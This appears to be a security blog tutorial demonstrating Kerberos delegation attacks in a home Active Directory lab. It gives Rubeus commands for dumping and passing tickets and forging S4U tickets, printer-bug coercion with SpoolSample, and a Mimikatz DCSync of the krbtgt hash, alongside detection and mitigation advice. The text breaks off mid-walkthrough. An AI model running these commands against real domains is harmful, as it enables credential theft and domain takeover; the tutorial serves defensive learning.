---
title: "Demystify Kerberos Delegation Attacks"
date: 2025-09-26T14:56:19+02:00
draft: false
toc: false
---
---
#### Table of Contents:
- [Abuse Unconstrained Delegation](#abuse-unconstrained-delegation-computer)
    - [Abuse Unconstrained Delegation (Computer) (1 method) - Windows](#abuse-unconstrained-delegation-computer-1-method---windows)
    - [Abuse Unconstrained Delegation (Computer) (2 method) - Windows](#abuse-unconstrained-delegation-computer-2-method---windows)
    - [Abuse Unconstrained Delegation - Detect & Mitigation](#abuse-unconstrained-delegation---detect--mitigation)
- [Abuse Protocol Transition](#abuse-protocol-transition)
    - [Abuse Protocol Transition (Computer) - Windows](#abuse-protocol-transition-computer---windows)
    - [Abuse Protocol Transition (User) - Windows](#abuse-protocol-transition-user---windows)
    - [Abuse Protocol Transition (Computer)- Linux](#abuse-protocol-transition-computer---linux)
    - [Abuse Protocol Transition (User) - Linux](#abuse-protocol-transition-user---linux)
    - [Abuse Protocol Transition - Detect & Mitigation](#abuse-protocol-transition---detect--mitigation)
- [Abuse RBCD via DACL](#abuse-rbcd-via-dacl)
    - [Abuse RBCD via DACL (Computer) - Windows](#abuse-rbcd-via-dacl-computer---windows)
    - [Abuse RBCD via DACL (Computer) - Linux](#abuse-rbcd-via-dacl-computer---linux)
    - [Abuse RBCD via DACL - Detect & Mitigation](#abuse-rbcd-via-dacl---detect--mitigation)
- [Abuse Kerberos Only](#abuse-kerberos-only)
    - [Abuse Kerberos Only (Computer) - Windows](#abuse-kerberos-only-computer---windows)
    - [Abuse Kerberos Only (User) - Windows](#abuse-kerberos-only-user---windows)
    - [Abuse Kerberos Only - Detect & Mitigation](#abuse-kerberos-only---detect--mitigation)
- [Outro](#outro)
- [References](#references)
---

# **Kerberos Delegation Attacks**

{{< image src="/demystify_kerberos_delegation_attacks/immagine.png" position="center" style="border-radius: 8px;">}}

## **Reading Guide**

The first article "[Demystify Kerberos Delegation](./demystify_kerberos_delegation.md)" was written in synergy with this article "Demystify Kerberos Delegation Attacks", the first details the theory of Kerberos Delegation while the second the most common attacks that can be carried out on it.

Being both articles particularly long, you could either read them individually in their entirety or follow a legend that i will provide shortly to directly move from theory (**T**) to practice (**P**) in the fastest possible way, which is the way i personally suggest to you:

**Introduction:**

  1. [T] - [What's Kerberos Delegation](./demystify_kerberos_delegation.md#1000)

**Unconstrained Delegation & Abuse:**

  2. [T] - [Unconstrained Delegation](./demystify_kerberos_delegation.md#unconstrained-delegation)
  3. [P] - [Abuse Unconstrained Delegation](#abuse-unconstrained-delegation-computer)
  4. [P] - [Abuse Unconstrained Delegation (Computer) (1 method) - Windows](#abuse-unconstrained-delegation-computer-1-method---windows)
  5. [P] - [Abuse Unconstrained Delegation (Computer) (2 method) - Windows](#abuse-unconstrained-delegation-computer-2-method---windows)
  6. [P] - [Abuse Unconstrained Delegation - Detect & Mitigation](#abuse-unconstrained-delegation---detect--mitigation)

**Constrained Delegation (Protocol Transition) & Abuse:**

  7. [T] - [Behaviour Change about Kerberos Delegation on Modern Windows System](./demystify_kerberos_delegation.md#behaviour-change-about-kerberos-delegation-on-modern-windows-system)
  8. [T] - [Constrained Delegation](./demystify_kerberos_delegation.md#constrained-delegation)
  9. [T] - [Constrained Delegation (Kerberos only)](./demystify_kerberos_delegation.md#constrained-delegation-kerberos-only)
  10. [T] - [Constrained Delegation (Use any authentication Protocol) / Protocol Transition](./demystify_kerberos_delegation.md#constrained-delegation-use-any-authentication-protocol--protocol-transition)
  11. [P] - [Abuse Protocol Transition](#abuse-protocol-transition)
  12. [P] - [Abuse Protocol Transition (Computer) - Windows](#abuse-protocol-transition-computer---windows)
  13. [P] - [Abuse Protocol Transition (User) - Windows](#abuse-protocol-transition-user---windows)
  14. [P] - [Abuse Protocol Transition (Computer) - Linux](#abuse-protocol-transition-computer---linux)
  15. [P] - [Abuse Protocol Transition (User) - Linux](#abuse-protocol-transition-computer---linux)
  16. [P] - [Abuse Protocol Transition - Detect & Mitigation](#abuse-protocol-transition---detect--mitigation)

**Resource Based Constrained Delegation (RBCD) & Abuse:**

  17. [T] - [Resource Based Constrained Delegation (RBCD)](./demystify_kerberos_delegation.md#resource-based-constrained-delegation-rbcd)
  18. [P] - [Abuse RBCD via DACL](#abuse-rbcd-via-dacl)
  19. [P] - [Abuse RBCD via DACL (Computer) - Windows](#abuse-rbcd-via-dacl-computer---windows)
  20. [P] - [Abuse RBCD via DACL (Computer) - Linux](#abuse-rbcd-via-dacl-computer---linux)
  21. [P] - [Abuse RBCD via DACL - Detect & Mitigation](#abuse-rbcd-via-dacl---detect--mitigation)

**Constrained Delegation (Kerberos Only) & Abuse:**

  22. [P] - [Abuse Kerberos Only](#abuse-kerberos-only)
  23. [P] - [Abuse Kerberos Only (Computer) - Windows](#abuse-kerberos-only-computer---windows)
  24. [P] - [Abuse Kerberos Only (User) - Windows](#abuse-kerberos-only-user---windows)
  25. [P] - [Abuse Kerberos Only - Detect & Mitigation](#abuse-kerberos-only---detect--mitigation)

## **Let's start with the Kerberos Delegation Attacks!**

Before you begin, if you are not confident with Kerberos Delegation, i highly suggest you to start reading my other article called "[Demystify Kerberos Delegation](./demystify_kerberos_delegation.md)".

In this article i'll describe the most common abuse about Kerberos Delegation, specificaly, my home lab ([>= 2021](./demystify_kerberos_delegation.md#behaviour-change-about-kerberos-delegation-on-modern-windows-system)) is build with:

- 1 Domain Controller: Windows Server 2022 ([fresh installation](https://www.microsoft.com/it-it/evalcenter/download-windows-server-2022))
- 2 Windows Client: Windows 10 ([fresh installation](https://www.microsoft.com/it-it/evalcenter/download-windows-10-enterprise))

So, let's start!

## **Abuse Unconstrained Delegation (Computer)**

**If a domain user performs a Kerberos authentication to a service with [Kerberos Unconstrained Delegation](./demystify_kerberos_delegation.md#unconstrained-delegation) enabled** (so when a Client access to a AP Front End), **in addition to sending the TGS Ticket to access the service itself they will also share their own TGT Ticket, consequently, if an attacker is able to compromise that machine with the Unconstrained Delegation enabled, they will be able to extract ALL the TGT Tickets of ANY domain user who connected to that service, consequently the attacker will be able to impersonate them with a Pass The Ticket (PtT) attack.**

> [As already mentioned](./demystify_kerberos_delegation.md#244), Kerberos Unconstrained Delegation can be enabled also on a regular domain user account and for this reason exists several scenario that can abuse also this configuration, for simplicity reason i choose to not describe them but if you want a deep dive please check others articles ([1](https://medium.com/@offsecdeer/user-based-unconstrained-delegation-and-spn-jacking-29b916d1ff25), [2](https://exploit.ph/user-constrained-delegation.html))

Below it can be observed how the THEPUNISHER machine that has the CIFS service with Kerberos Unconstrained Delegation enabled, after a user like MARVEL\pparker logged into that service, has effectively cached in memory the TGT Ticket (Forwarded) of the user in question.

{{< image src="/demystify_kerberos_delegation_attacks/41.png" position="center" style="border-radius: 8px;">}}

> In my tests after the user "MARVEL\pparker" closed the PsExec session established with the THEPUNISHER machine, that machine, considering that action as a "logout", will delete the "Logon Session" of the user "MARVEL\pparker" and consequently also the related TGT Ticket (previously cached) contained within it.

**So, if an attacker compromises a machine that has a service with Kerberos Unconstrained Delegation enabled they are able to:**

- **Dump ALL the TGT Tickets of all users who independently authenticated normally to the service.**

- **Force the (Kerberos) authentication of a user to the service with Kerberos Unconstrained Delegation enabled (a.k.a "[Coerced Auth](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/)"), in this way the related TGT Ticket will be cached on the machine and can be dumped by the attacker**, for example it can be achieved by:

	- **Internal Phishing**: Send phishing emails to users asking them (e.g., via a click link forcing an SMB Authentication via UNC - by default Kerberos is used) to perform an authentication (Kerberos) to the service with Unconstrained Delegation enabled hosted on the machine compromised by the attacker.
	
    <span id=1004>

	- **Coerced Authentication**: Force authentication by a service (the related Service Account will log on) to the service with Unconstrained Delegation enabled; to do this, one can for example exploit the "Printer Bug" feature ([or similar](https://www.thehacker.recipes/ad/movement/kerberos/delegations/unconstrained)).

> Let's assume a WORKSTATION1 machine that runs an HTTP service with the Service Account WORKSTATION1\$, since this account has the "TRUSTED\_FOR\_DELEGATION" flag set to "TRUE" / "1" the HTTP service will have Kerberos Unconstrained Delegation enabled, [given that ALSO ALL services started on that machine under the Local System account in the Kerberos context will use the Service Account WORKSTATION01\$ (for example by default the CIFS or LDAP service)](./not_so_brief_overview_about_kerberos.md#17), those services will also have Kerberos Unconstrained Delegation enabled; consequently, if an attacker, after compromising a machine, discovers that the related Computer Account has the "TRUSTED\_FOR\_DELEGATION" flag set to "TRUE" / "1", they could force authentication to ANY service started with that machine's Local System account such as CIFS or LDAP, and then dump the obtained TGT.

To identify whether Unconstrained Delegation is enabled within the domain, it is necessary to verify which AD objects have the "[TRUSTED\_FOR\_DELEGATION](./demystify_kerberos_delegation.md#25)" flag set to "TRUE" / "1" within their "UserAccountControl" property, to do this in Windows we can for example use "[Get-ADComputer](https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-adcomputer?view=windowsserver2022-ps)".

The attacker could use the built-in PowerShell utility ""[Get-ADComputer](https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-adcomputer?view=windowsserver2022-ps)", which is available only if the "[Active Directory Module](https://learn.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2025-ps)" exists on the machine (present by default on Windows Server, while on Windows Client it must be installed).

```
PS C:\> Get-ADComputer -Filter {TrustedForDelegation -eq $true -and primarygroupid -eq 515} -Properties trustedfordelegation,serviceprincipalname,description
```

{{< image src="/demystify_kerberos_delegation_attacks/44.png" position="center" style="border-radius: 8px;">}}

## **Abuse Unconstrained Delegation (Computer) (1 method) - Windows**

**Dump ALL the TGT Tickets of all users who independently authenticated normally to the service.**

The user MARVEL\pparker (Domain Admin) logged into a service with Kerberos Unconstrained Delegation enabled hosted on the THEPUNISHER machine, consequently, since the attacker has compromised the THEPUNISHER machine they are able to:

1. **Dump the TGT Ticket of the user "MARVEL\pparker"**

    After compromising a machine that hosts a service with Kerberos Unconstrained Delegation enabled, an attacker can dump all cached Tickets (on Windows) with the following commands: [sekurlsa::tickets /export](https://tools.thehacker.recipes/mimikatz/modules/sekurlsa/tickets) (Mimikatz), [dump](https://github.com/GhostPack/Rubeus?tab=readme-ov-file#dump) (Rubeus), etc, in this example we will use "Rubeus".

    With the "[triage](https://github.com/GhostPack/Rubeus?tab=readme-ov-file#triagesek)" command, if Rubeus was started with an administrative user it will print to the screen a table containing ALL the Kerberos Tickets present on the system:
    
    ```
    C:> Rubeus.exe triage
    ```

    {{< image src="/demystify_kerberos_delegation_attacks/45.png" position="center" style="border-radius: 8px;">}}

    As you can see, there is a TGT Ticket (you can tell from the "krbtgt" service) related to the user MARVEL\pparker (ID:0x270352)

    Specifically, the "dump" command will by default print ALL (if executed with administrative privilege) the Kerberos Tickets present on the system in base64 "blob" form which can be easily used in combo with the ["ppt" command that we'll see later to perform the "Pass The Ticket" Attack](#23); in this example the parameters "/luid" (ID of the LogonSession involved) & "/service" (indicating the "krbtgt" service will be equivalent to indicating the TGT Ticket) were used to dump the TGT Ticket of the user "MARVEL\pparker" (ID:0x270352)

    ```
    C:> Rubeus.exe dump /luid:<logonsession_uid> /service:<service>
    ```

    {{< image src="/demystify_kerberos_delegation_attacks/46.png" position="center" style="border-radius: 8px;">}}

2. **Perform a Pass The Ticket (PtT) attack**

    Before to proceed i want to demonstrate that with the current user, so "MARVEL\fcastle", which is the account the attacker used to compromise this machine, does NOT have administrative permissions because it CANNOT access the Domain Controller.

    {{< image src="/demystify_kerberos_delegation_attacks/47.png" position="center" style="border-radius: 8px;">}}

    > With Wireshark it is possible to actually verify that the Kerberos protocol was used for the authentication attempt ([AP-REQ](./not_so_brief_overview_about_kerberos.md#23) contained in the SMB protocol packet).

    In this example in order to perform a Pass The Ticket (PtT) without creating any kind of DoS we will use the so-called Sacrificial Process.

    ```
    C:> Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
    ```

    {{< image src="/demystify_kerberos_delegation_attacks/48.png" position="center" style="border-radius: 8px;">}}

    As you can see a new "cmd.exe" process has now been created; that's a new shell associated with a new LogonSession with fake credentials and WITHOUT Kerberos Tickets associated, consequently the attacker can now import Kerberos Tickets into this shell to carry out the Pass The Ticket (PtT) attack.

    We therefore perform the Pass The Ticket (PtT):
    
    <span id=23>

    ```
    C:> Rubeus.exe ptt /ticket:<blob_encode64_ticket>
    ```

    {{< image src="/demystify_kerberos_delegation_attacks/49.png" position="center" style="border-radius: 8px;">}}

    As you can see below, the attacker is now able to correctly impersonate the Domain Admin user "MARVEL\pparker" and thus access the Domain Controller.

    {{< image src="/demystify_kerberos_delegation_attacks/50.png" position="center" style="border-radius: 8px;">}}

## **Abuse Unconstrained Delegation (Computer) (2 method) - Windows**

**Force the authentication (Kerberos) of a user to the service with Kerberos Unconstrained Delegation enabled (a.k.a "[Coerced Auth](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/)"), in this way the relative TGT Ticket will be cached on the machine and can be dumped by the attacker; in this section we will see how to force the authentication using the so-called "Printer Bug".**

"Printer Bug" is a flaw never fully patched by Microsoft that affects the [MS-RPRN protocol (Print System Remote Protocol)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/d42db7d5-f141-4466-8f47-0a4be14e2fc1), this protocol briefly defines print jobs between a Client and a Print Server (any machine with the "spooler" service enabled)

[In short](https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1#a2e6), this "Printer Bug" allows any domain user (every user included in the "[Authenticated Users](https://zer1t0.gitlab.io/posts/attacking_ad/#kerberos-unconstrained-delegation)" group) to connect to the so-called "Spools Named Pipe" of a Printer Server using the "[RpcOpenPrinter](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/989357e2-446e-4872-bb38-1dce21e1313f)" method and use the "[RpcRemoteFirstPrinterChangeNotificationEx](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/b8b414d9-f1cd-4191-bb6b-87d09ab2fd83)" method which it forces a SMB authentication (Kerberos or NTLM) by the PrinterServer towards any machine specified by the Client.

An attacker, after compromising a machine with Kerberos Unconstrained Delegation enabled, could use the "PrinterBug" to force a Kerberos SMB authentication of any PrinterServer (in reality the Service Account of the print service will be used - [which being usually LocalSystem will be the "Computer Account" of the machine in the Kerberos context](./not_so_brief_overview_about_kerberos/#17)) towards the service with Unconstrained Delegation enabled; in this way the attacker can retrieve the TGT Ticket of the victim Computer Account.

Since by default the "spool" (print) service is enabled on almost ALL machines, an attacker could perform this attack against a Domain Controller thus managing to retrieve the TGT Ticket of the DC's "Computer Account", in this way the attacker could use it to perform a DC Sync and therefore compromise the domain.

<span id=25>

> A "TGT Ticket Forwarded" works slightly differently compared to a "traditional" TGT Ticket; specifically, if the attacker obtains a "TGT Ticket Forwarded" of a Computer Account such as THEPUNISHER\$ unfortunately it will NOT be possible with it to log on to the SMB share "C\$" of the THEPUNISHER machine, consequently it will NOT be possible to log on via PsExec to the target machine.

Let's see in practice how to execute this attack:

1. **The attacker has compromised the THEPUNISHER machine which has a service with Unrestricted Kerberos Delegation enabled**

    {{< image src="/demystify_kerberos_delegation_attacks/51.png" position="center" style="border-radius: 8px;">}}

2. **The attacker identifies which machines that have connectivity with THEPUNISHER have the "spooler" service enabled and are therefore affected by the "PrinterBug", in our example we will test the Domain Controller HYDRA-DC.**

    To identify which machines have the "spooler" service enabled, among other methods, it is possible to:

    - *PS C:> ls \\\\<machine_target>\pipe\spoolss**
    
        If we do NOT get an error it means that the target machine HAS the spooler service enabled

    {{< image src="/demystify_kerberos_delegation_attacks/52.png" position="center" style="border-radius: 8px;">}}

    - *PS C:> [SpoolerScan.ps1](https://github.com/vletoux/SpoolerScanner)*
    
        The source must be modified by inserting the IP of the machine you want to check, as you can see in our example the Domain Controller HAS the spooler service enabled.

        {{< image src="/demystify_kerberos_delegation_attacks/53.png" position="center" style="border-radius: 8px;">}}
        <br>
        
        {{< image src="/demystify_kerberos_delegation_attacks/54.png" position="center" style="border-radius: 8px;">}}

    As you can see in our example the Domain Controller HAS the spooler service enabled

3. **The attacker, via the "Printer Bug", forces the Service Account (Computer Account) of the "spooler" service present on the Domain Controller "HYDRA-DC" to authenticate via Kerberos to the SMB service of the machine the attacker compromised named THEPUNISHER, i.e. the one with Kerberos Unconstrained Delegation enabled.**

    Before exploiting the "Printer Bug" the attacker could execute the "[monitor](https://github.com/GhostPack/Rubeus?tab=readme-ov-file#monitor)" command of "Rubeus" (almost analogous to "Rubeus [dump](https://github.com/GhostPack/Rubeus?tab=readme-ov-file#dump)" repeated) on the machine THEPUNISHER (to be executed with administrative permissions to display the Kerberos TTs of ALL users), so the machine with the service with the Unconstrained Delegation enabled, in this way the attacker will monitor and print on screen ALL the Kerberos Tickets that he will receive. 
    
    Specifically the "interval" parameter specifies how often every certain amount of time it must print on screen the new TGTs captured, while "nowrap" will print the Base64Encoded TTs without newlines. 
    
    > The command requires to be executed with administrative

    ```
    C:> Rubeus.exe monitor /interval:5 /nowrap 
    ```

    {{< image src="/demystify_kerberos_delegation_attacks/55.png" position="center" style="border-radius: 8px;">}}

    Having done this, the attacker can exploit the PrinterBug using several tools, for example: [SpoolSample](https://github.com/leechristensen/SpoolSample) (to be compiled) or [printerbug.py](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py), in our example we'll use the [first already compiled](https://github.com/jtmpu/PrecompiledBinaries/blob/master/SpoolSample.exe); all of this can be executed ALSO directly on the machine with Unconstrained Delegation enabled, as in our case "THEPUNISHER".

    > We used the PrinterBug just as an example, an attacker could use other tools to perform an "[Coerced Auth](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/) technique", for example using [DFSCoerce](https://github.com/Wh04m1001/DFSCoerce?tab=readme-ov-file) (it uses [MS-DFSNM protocol](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/ms-dfsnm)) and [PetitPotam](https://github.com/topotam/PetitPotam) (it uses [MS-EFSRPC protocol](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/ms-efsr)); 

    ```
    C:\> SpoolSample.exe <DC_Hostname> <Hostname_with_unconstrained_enabled>
    ```

    {{< image src="/demystify_kerberos_delegation_attacks/56.png" position="center" style="border-radius: 8px;">}}

    As you can see the attacker has now recovered the TGT Ticket of the Computer Account HYDRA-DC\$.

    > It is necessary to specify the hostname and not the IP because otherwise NTLM authentication will be used and no delegation will be applied.

4. **By performing Pass The Ticket (PtT) the attacker impersonates the Computer Account of the Domain Controller and consequently will be able to perform a DC Sync Attack.**

    Now that the attacker possesses the TGT Ticket (forwarded) of the Computer Account of the Domain Controller, in this case the account HYDRA-DC\$, [given that this Ticket does NOT allow authentication to the DC](#25) BUT allows a DCSync Attack, we will retrieve via DCSync the password of the "krbtgt" account with which the attacker will be able to forge a Golden Ticket to access the DC and thus compromise the domain.

    In this example, to perform a Pass The Ticket (PtT) without creating any kind of service disruption we will use the so-called Sacrifical Process.

    ```
    C:> Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
    ```
        
    {{< image src="/demystify_kerberos_delegation_attacks/56.png" position="center" style="border-radius: 8px;">}}

    As you can see a new "cmd.exe" process has now been created; that's a new shell associated with a new LogonSession with fake credentials and WITHOUT Kerberos Tickets associated, consequently the attacker can now import Kerberos Tickets into this shell to carry out the Pass The Ticket (PtT) attack.

    We then perform the Pass The Ticket (PtT):

    ```
    C:> Rubeus.exe ptt /ticket:<blob_encode64_ticket>
    ```
    
    {{< image src="/demystify_kerberos_delegation_attacks/57.png" position="center" style="border-radius: 8px;">}}

    As you can see below now the attacker is able to perform a DCSync using for example the "[lsadump::dcsync](https://adsecurity.org/?page_id=1821)" command of Mimikatz, with it he dumped for example the password of the krbtgt account to create a Golden Ticket and so compromise the domain.

    {{< image src="/demystify_kerberos_delegation_attacks/58.png" position="center" style="border-radius: 8px;">}}

## **Abuse Unconstrained Delegation - Detect & Mitigation**

**Detect**

Ask your SIEM / Detection Engineer to create a [detection rule](https://learn.microsoft.com/en-us/defender-xdr/custom-detection-rules) ad hoc 😝

Jokes aside, for an high overview i suggest you to start using an Identity Monitoring Solution (e.g. [Defender for Identity](https://learn.microsoft.com/en-us/defender-for-identity/what-is)) and only after that to perform a [deep dive into a custom rule](https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1).

**Mitigation**

The only real solution is to disable the Unconstrained Delegation on every host within your infrastructure (Domain Controller excluded, [disable it will perform issues](https://en.hackndo.com/constrained-unconstrained-delegation)) and use another type of Kerberos Delegation.

If it's not possible to disable the Unconstrained Delegation, there are mitigations that can mitigate the impact:

- [Disable the PrintSpooler service on ALL Domain Controllers & all related Coerced Auth](#1004) (it blocks the [Abuse Unconstrained Delegation (Computer) (2 method) attack](#abuse-unconstrained-delegation-computer-2-method---windows))

- Configure the property "Account is sensitive and cannot be delegated" on privileged accounts ([detailed explaination here](#abuse-protocol-transition---detect--mitigation)) (it mitigates the [Abuse Unconstrained Delegation (Computer) (1 method) attack](#abuse-unconstrained-delegation-computer-1-method---windows))

- Add privileged accounts to the "Protected Users Group" ([detailed explaination here](#abuse-protocol-transition---detect--mitigation)) (it mitigates the [Abuse Unconstrained Delegation (Computer) (1 method) attack](#abuse-unconstrained-delegation-computer-1-method---windows)).


## **Abuse Protocol Transition**

If an attacker compromises a Service Account with "[Constrained Delegation (Use any authentication Protocol)](./demystify_kerberos_delegation.md#constrained-delegation-use-any-authentication-protocol--protocol-transition)" enabled (a.k.a Protocol Transition), so, in most scenarios a Computer Account (usually by compromising the corresponding machine), the attacker, by impersonating the machine, could invoke the ["S4U2Self" & "S4U2Proxy"](./demystify_kerberos_delegation.md#100) extensions and thus obtain a TGS Ticket belonging to a certain user valid to access the Back-End service that the compromised machine is authorized to access on behalf of the Client (so the services indicated in the "[msds-allowedtodelegateto](./demystify_kerberos_delegation.md#101)" flag).

That said, there are two other extremely useful pieces of information to consider:

1. [As already mentioned](./demystify_kerberos_delegation.md#31), when the [S4U2Self](./demystify_kerberos_delegation.md#2-krb_tgs_req-s4u2self--s4uself-request) extension is invoked, it is necessary to specify which domain user will be the owner of the TGS Ticket that will be issued, in this step i want to highlight that the KDC will performs NO checks about that so it will issue the TGS Ticket for ANY specified domain user.

    Knowing this the attacker can invoke the [S4U2Self](./demystify_kerberos_delegation.md#2-krb_tgs_req-s4u2self--s4uself-request) extension for ANY domain user and thus obtain a TGS Ticket belonging to an arbitrary domain user, so the attacker will be able to authenticate to the Back-End service impersonating ANY domain user.
<span id=4>

2. The TGS Ticket always consists of two parts: a NON encrypted part containing the SPN of the requested service (e.g: CIFS/WORKSTATION01) and an "encrypted" part containing other information.

    Since the SPN contained in the TGS Ticket is NOT encrypted, an attacker could modify it (it would still be a valid TGS Ticket) by replacing the service of the target machine with another service also exposed on the target machine, thus, an attacker could for example obtain a valid TGS Ticket for the CIFS service on the SQL01 machine (CIFS\SQL01) and modify it to make it valid for the HTTP service on the same SQL01 machine (HTTP/SQL01) before sending it in a KRB\_AP\_REQ.

<span id=1>

> The service that is inserted must have the same Service Account as the replaced service (since the Service Account is often the Computer Account this requirement will be usually satisfied - [because the Computer Account is the Service Account in the Kerberos context of ANY service running under the LocalSystem account, including usually CIFS, HTTP, etc; so a lot of services](./not_so_brief_overview_about_kerberos.md#17)), only in this way will the TGS Ticket with the modified SPN be valid.

With this information in mind we figure out the following conclusion:

**If an attacker compromises a Service Account with "[Constrained Delegation (Use any authentication Protocol)](./demystify_kerberos_delegation.md#constrained-delegation-use-any-authentication-protocol--protocol-transition)" enabled (a.k.a Protocol Transition), so, in most scenarios a Computer Account (usually by compromising the related machine), the attacker impersonating the machine could invoke the ["S4U2Self" & "S4U2Proxy"](./demystify_kerberos_delegation.md#100) extension and thus obtain a TGS Ticket belonging to ANY domain user and valid to access ANY ([usually](#1)) Back-End service that the compromised machine is authorized to access on behalf of the Client (indicated in the "[msds-allowedtodelegateto](./demystify_kerberos_delegation.md#101)" flag).**

By exploiting this attack, the attacker will therefore be able to authenticate with administrative privileges (since they can impersonate ANY domain user) to certain services; depending on the type of service accessed, the attacker could perform [various malicious activities](https://zer1t0.gitlab.io/posts/attacking_ad/#s4u-attacks), for example:

- **LDAP on a Domain Controller**: As described by Microsoft ([1](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/06205d97-30da-4fdc-a276-3fd831b272e0), [2](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/0597aff6-0177-4d52-99f2-14a5441bc3c1)), some functionalities provided by the MDRS protocol (the protocol used to perform a DC Sync Attack) are also accessible via the LDAP protocol; this overlap of functionalities, broadly speaking, allows an attacker who obtains a valid TGS Ticket for the LDAP service (impersonating an administrative user, e.g., Domain Admin) to perform a [DC Sync Attack](https://adsecurity.org/?p=1729) against the DC.

> I don’t fully understand how this happens under-the-hood; sniffing with Wireshark shows that the LDAP service is not actually queried, instead, packet exchanges occur exclusively with the services used by the MDRS protocol.

- **SMB**: If the attacker impersonates an administrative user (e.g., Domain Admin) to the SMB service (CIFS in SPN context) of a computer, the attacker could authenticate using tools like "psexec" (depending on the PsExec tool used, it will impersonate the LocalSystem / Local Administrator user).

- **MSSQL**: If the attacker impersonates an administrative user (e.g., Domain Admin) to the MSSQL service, the attacker, in addition to potentially obtaining sensitive data contained within, can exploit the MSSQL service to execute local commands on the machine via "xp\_cmdshell", use "[SQL Server Link](https://www.netspi.com/blog/technical-blog/network-pentesting/sql-server-link-crawling-powerupsql/)" and etc.

<span id=48>

- **HTTP**: Since the [WinRM](https://blog.scalefusion.com/it/windows-remote-management-guide/) service uses the HTTP service, if the attacker impersonates an administrative user (e.g., Domain Admin) to the HTTP service of a computer, and the machine has WinRM enabled, the attacker could authenticate to it.

> Often an error related to [a missing "Logon Session" occurs](https://sensepost.com/blog/2022/constrained-delegation-considerations-for-lateral-movement/); in that case, retry the attack ensuring that the command exploiting Kerberos Delegation is executed from a shell with a High Integrity Level Token and that no additional Tickets have been previously injected into that Logon Session; after that, try logging in both via PowerShell Remoting (Enter-PSSession, New-PSSession, and Invoke-Command) and WinRS; using this method, logging in usually succeeds.

**In conclusion, broadly speaking, if an attacker compromises a machine (or a domain user acting as a Service Account) with "Constrained Delegation (Use any authentication Protocol)" enabled, they can also compromise the machine (usually via CIFS) that the compromised system is authorized (via the "msds-allowedtodelegateto" flag) to access on behalf of the Client.**

## **Abuse Protocol Transition (Computer) - Windows**

In this scenario, we will see how to exploit a **Constrained Delegation (Use any authentication Protocol) (also called Protocol Transition)** from a Windows machine.

1. **Identify which Service Accounts have "Constrained Delegation (Use any authentication Protocol)" enabled (in this scenario, we are looking for Computer Accounts acting as Service Accounts).**

    There are different methods to identify which Service Accounts have "Constrained Delegation (Use any authentication Protocol)"; on Windows, one of the most common is using "PowerView":

    ```
    PS C:> Get-DomainComputer --TrustedToAuth
    ```
    <span id=2>

    {{< image src="/demystify_kerberos_delegation_attacks/1.png" position="center" style="border-radius: 8px;">}}

    As you can see, the Computer Account THEPUNISHER\$ has the "[TRUSTED\_TO\_AUTH\_FOR\_DELEGATION](./demystify_kerberos_delegation.md#102)" flag and therefore has [Constrained Delegation (Use any authentication Protocol)](./demystify_kerberos_delegation.md#constrained-delegation-use-any-authentication-protocol--protocol-transition) enabled; specifically, this account (so THEPUNISHER$) and therefore ALL services running under it will be able to authenticate on behalf of the Client exclusively to the SPN "HTTP/SPIDERMAN," so to the HTTP service of the SPIDERMAN machine.

    Indeed, inspecting the "Delegation" tab of the THEPUNISHER computer via ADUC, we will find this     configuration.

    {{< image src="/demystify_kerberos_delegation_attacks/2.png" position="center" style="border-radius: 8px;">}}

2. **The attacker compromises the Service Account with Constrained Delegation (Use any authentication Protocol) enabled.**

    In this scenario, the attacker managed to authenticate with administrative privileges to the THEPUNISHER machine and, by dumping LSASS, obtained the credentials of the Computer Account THEPUNISHER\$, so the Service Account with the Constrained Delegation (Use any authentication Protocol) enabled.

    {{< image src="/demystify_kerberos_delegation_attacks/3.png" position="center" style="border-radius: 8px;">}}

3. **The attacker obtains a valid TGS Ticket (for Domain Admin) to authenticate to the CIFS service hosted on the SPIDERMAN machine (that is, the machine authorized in the "msds-allowedtodelegateto" flag).**

    The attacker, now possessing the credentials of the Service Account THEPUNISHER\$, since this account has "Constrained Delegation (Use any authentication Protocol)", can abuse it to invoke the S4U2Self & S4U2Proxy extensions and thus obtain a TGS Ticket belonging to a Domain Admin user valid to access the HTTP service of the SPIDERMAN machine ([so, the service specified in the "msds-allowedtodelegateto" flag](#2)); furthermore, in this scenario the attacker decides to replace the SPN "HTTP/SPIDERMAN" with the SPN "CIFS/SPIDERMAN", managing in this way to authenticate via PsExec to the SPIDERMAN machine.

    Since we will inject the desired TGS Ticket into memory, first of all we use the so-called Sacrificial Process.

    ```
    C:> Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
    ```

    {{< image src="/demystify_kerberos_delegation_attacks/4.png" position="center" style="border-radius: 8px;">}}

    Then execute the following Rubeus command within the Sacrificial Process.
    <span id=5>
   
    ```
    C:\> Rubeus.exe s4u /impersonateuser:<User_To_Impersonate> /msdsspn:<SPN_inside_in_msds-allowedtodelegateto> /altservice:<Desired_SPN> /user:<Service_Account> /rc4:<NTLM_Service_Account> /nowrap /ptt
    ```

    <span id=401>

    Let's analyze ALL the operations performed by Rubeus.

    1. **Rubeus sent a "[KRB\_AS\_REQ](./not_so_brief_overview_about_kerberos.md#39)" to obtain the TGT Ticket of the Computer Account THEPUNISHER\$, [information necessary](./demystify_kerberos_delegation.md#109) to invoke the "KRB\_TGS\_REQ (S4USelf)".**
      
       <!-- only for spacing -->
    
        {{< image src="/demystify_kerberos_delegation_attacks/5.png" position="center" style="border-radius: 8px;">}}
        <br>
